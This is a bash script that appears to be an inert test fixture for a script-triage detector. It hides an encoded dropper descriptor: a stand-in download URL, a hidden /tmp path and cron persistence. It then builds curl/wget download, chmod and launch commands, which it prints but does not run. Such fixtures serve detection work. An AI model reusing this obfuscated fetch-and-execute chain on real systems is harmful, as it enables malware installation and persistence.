#!/usr/bin/env bash
# Huntress Script Triage -- inert static-analysis fixture (bash_linux)
readonly Material_f326fe2b='125 68 56 131 122 123 108 119 122 68 119 121 118 109 112 115 108 102 111 118 122 123 51 104 106 120 124 112 121 108 102 121 108 116 118 123 108 51 126 121 112 123 108 102 109 112 115 108 51 106 111 104 117 110 108 102 116 118 107 108 51 107 112 122 119 104 123 106 111 102 119 121 118 106 108 122 122 131 104 107 104 119 123 108 121 68 116 124 115 123 112 102 124 123 112 115 112 123 128 102 109 104 115 115 105 104 106 114 131 122 123 104 110 108 102 106 118 124 117 123 68 60 131 106 104 116 119 104 112 110 117 102 112 107 68 106 104 116 119 104 112 110 117 52 61 56 62 64 59 104 64 56 60 104 131 124 121 115 68 111 123 123 119 122 65 54 54 61 56 62 64 59 104 64 56 60 104 53 108 127 104 116 119 115 108 53 112 117 125 104 115 112 107 54 64 55 60 55 106 56 59 104 53 122 111 131 124 122 108 121 102 104 110 108 117 123 68 79 124 117 123 121 108 122 122 83 104 105 54 61 56 62 64 59 104 64 56 60 104 131 109 112 115 108 102 119 104 123 111 68 54 123 116 119 54 111 124 117 123 121 108 122 122 52 106 104 106 111 108 54 53 122 123 104 110 108 52 61 56 62 64 59 104 64 56 60 104 131 104 121 106 111 102 119 121 118 105 108 68 124 117 104 116 108 52 116 131 122 108 121 125 112 106 108 102 117 104 116 108 68 124 119 107 104 123 108 52 61 56 62 64 59 104 64 56 60 104 53 122 108 121 125 112 106 108 131 106 121 118 117 102 119 104 123 111 68 54 108 123 106 54 106 121 118 117 53 107 54 124 119 107 104 123 108 52 61 56 62 64 59 104 64 56 60 104'
readonly Codec_f326fe2b='decimal_space|add_modulo_256|07'

Load_f326fe2b() {
  item1=()
  local IFS=' '
  read -r -a item1 <<< "${Material_f326fe2b}"
}

Decode_f326fe2b() {
  item2=()
  local item5
  for ((item5=0; item5<${#item1[@]}; item5++)); do
    item2+=("$(((item1[item5] - 7 + 256) % 256))")
  done
}

Recover_f326fe2b() {
  local -a item1 item2
  local item3 item4 item8 item5
  if ((2 > 1)); then item4=left; else item4=right; fi
  Load_f326fe2b
  item8=0; while ((item8 < 1)); do Decode_f326fe2b; ((item8+=1)); done
  item3=''
  local octal character
  for item5 in "${!item2[@]}"; do
    printf -v octal '%03o' "${item2[item5]}"
    printf -v character '%b' "\\$octal"
    item3+="$character"
  done
  printf '%s\n' "$item3"
}

Inspect_f326fe2b() { local recovered; recovered="$(Recover_f326fe2b)"; printf '%s\n' "$recovered"; }

Plan_f326fe2b() {
  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
  descriptor="$(Inspect_f326fe2b)"
  local -a fields
  IFS='|' read -r -a fields <<< "$descriptor"
  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
  local -a profile_command=(uname -m) request_primary=(curl --fail --silent --show-error -o "$file_path" "$url") request_fallback=(wget -qO "$file_path" "$url") permission_command=(chmod 0700 "$file_path") launch_command=("$file_path") cron_descriptor=(printf '%s' "$cron_path" "$service_name")
  declare -p profile_command request_primary request_fallback permission_command launch_command cron_descriptor
}

if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_f326fe2b; fi
